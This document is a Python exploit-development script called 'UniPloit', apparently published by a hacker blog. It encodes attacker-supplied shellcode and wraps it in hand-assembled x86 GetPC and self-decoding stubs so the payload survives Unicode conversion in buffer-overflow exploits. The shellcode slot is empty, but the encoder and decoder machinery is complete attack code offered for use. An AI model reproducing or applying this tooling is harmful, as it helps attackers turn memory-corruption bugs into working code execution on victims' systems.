#!/usr/bin/env python3.3
#======================================================#
#    _   _         _  ____   _         _  _            #
#   | | | | _ __  (_)|  _ \ | |  ___  (_)| |_          #
#   | | | || '_ \ | || |_) || | / _ \ | || __|         #
#   | |_| || | | || ||  __/ | || (_) || || |_          #
#    \___/ |_| |_||_||_|    |_| \___/ |_| \__|         #
#           _____ _____         ___          _____     #
#          |__  /|___ /  _ __  / _ \  _ __  |___ /     #
#            / /   |_ \ | '__|| | | || '_ \   |_ \     #
#           / /_  ___) || |   | |_| || | | | ___) |    #
#          /____||____/ |_|    \___/ |_| |_||____/     #
#                                                      #
#                           http://01day.wordpress.com #
#======================================================#
# Title: UniPloit - For Unicode BOF Exploitation       #
# Release Date: 06/08/2013                             #
# Author: Z3r0n3 - z3r0n3@mail.com                     #
# blog: http://01day.wordpress.com                     #
# twitter: @Z3r0n301                                   #
#======================================================#

import struct

def encode(shellcode):
    scL=list(shellcode)
    scL=list(map(lambda x: hex(x), scL))
    for n in range(len(scL)):
        if scL[n] in badUni+badChar:
            scL[n:n+1]=['0x88',hex(int(scL[n],0)-33)]
    sc=bytes(list(map(lambda x: int(x, 0), scL)))
    return sc

def show(buf):
    for n in range(len(buf)//16):
        print(buf[n*16:(n*16)+16])
    if len(buf)%16:
        print(buf[(n+1)*16:])
    input("Press any key to leave ")

# Put your shellcode below
shellcode = (

    );


# List of bytes that will be changed after the unicode conversion
badUni=[
    '0x80','0x82','0x83','0x84','0x85','0x86','0x87','0x88','0x89',
    '0x8a','0x8b','0x8c','0x8e','0x91','0x92','0x93','0x94','0x95',
    '0x96','0x97','0x98','0x99','0x9a','0x9b','0x9c','0x9e','0x9f',
    '0xc6',
    ];

# You can add the bad chars below if they are in range (00, 7F) & (C1, FF)
badChar=[
         ];

shellcode=encode(shellcode)

GetPC=(                      # GetPC - Unicode impelmentation
    b"\x8E"
    b"\xB8\x90\x90"          # MOV EAX, 0x90009000
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x4C"                  # DEC ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x05\xC3\x90"          # ADD EAX, 0x9000C300
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x44"                  # INC ESP
    b"\x8E"
    b"\xB8\x40\x50"          # MOV EAX, 0x50004000
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x4C"                  # DEC ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x05\x40\x40"          # ADD EAX, 0x40004000
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x44"                  # DEC ESP
    b"\x8E"
    b"\xB8\x44\xF4"          # MOV EAX, 0xF4004400
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x4C"                  # DEC ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x05\x45\x12"          # ADD EAX, 0x12004500
    b"\x8E"
    b"\x05\x46\x12"          # ADD EAX, 0x12004600
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x44"                  # INC ESP
    b"\x8E"
    b"\xB8\x74\xE8"          # MOV EAX,E8007400
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x4C"                  # DEC ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x05\xD9\x24"          # ADD EAX, 0x2400D900
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x44"                  # INC ESP
    b"\x8E"
    b"\x54"                  # PUSH ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\xD9"                  # FLD DWORD PTR DS:[EAX]
    b"\xC3"                  # RETN
    )

DecoderGen=(
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x4C"                  # DEC ESP
    b"\x8E"
    b"\x58"                  # POP EAX
    b"\x8E"
    b"\x05\x8D\x30"          # ADD EAX, 0x30003000
    b"\x8E"
    b"\x2D\x07\x30"          # SUB EAX, 0x30001500
    b"\x8E"
    b"\x50"                  # PUSH EAX
    b"\x8E"
    b"\x44"                  # INC ESP
    b"\x8E"
    b"\x5A"                  # POP EDX
    b"\x8E"
    b"\x88\x6A"              # MOV BYTE PTR DS:[EDX],0x6A
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\x1E"              # MOV BYTE PTR DS:[EDX],0x1D
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\x59"              # MOV BYTE PTR DS:[EDX],0x59
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\x46"              # MOV BYTE PTR DS:[EDX],0x46
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\xA4"              # MOV BYTE PTR DS:[EDX],0xA4
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\xE0"              # MOV BYTE PTR DS:[EDX],0xE0
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x88\xFC"              # MOV BYTE PTR DS:[EDX],0xFC
    b"\x8E"
    b"\x42"                  # INC EDX
    b"\x8E"
    b"\x52"                  # PUSH EDX
    b"\x8E"
    b"\x5F"                  # POP EDI
    b"\x8E"
    b"\x52"                  # PUSH EDX
    b"\x8E"
    b"\x5E"                  # POP ESI
    b"\x8E"
    b"\x46"                  # INC ESI
    b"\x8E"
    b"\x47"                  # INC EDI
    b"AAA"
    b"\xB9"
    )
DecoderGen+=struct.pack('H', len(shellcode)+257)
DecoderGen+=(
    b"\x90\x90"              # MOV ECX,0x90900190
    b"\x81\xE9\x01\x01\x90\x90" # SUB ECX,0x90900101
    b"\xFE\x42\x0E"          # INC BYTE PTR DS:[EDX+0x0E]
    b"\x81\x7E\x01\xC6\x75\x07\x46\x46\xB0\x21\x10\x46\x01\x46\xA4\xE0\xEF"
    );



# Putting everything together
wrap=GetPC+DecoderGen+shellcode
print("""
#=================================================#
#     __  __        _  ____   __        _  __     #
#    / / / /____   (_)/ __ \ / /____   (_)/ /_    #
#   / / / // __ \ / // /_/ // // __ \ / // __/    #
#  / /_/ // / / // // ____// // /_/ // // /_      #
#  \____//_/ /_//_//_/    /_/ \____//_/ \__/      #
#                                 by Z3r0n3       #
#                                 z3r0n3@mail.com #
#           http://01day.wordpress.com            #
#=================================================#
""")
show(wrap)

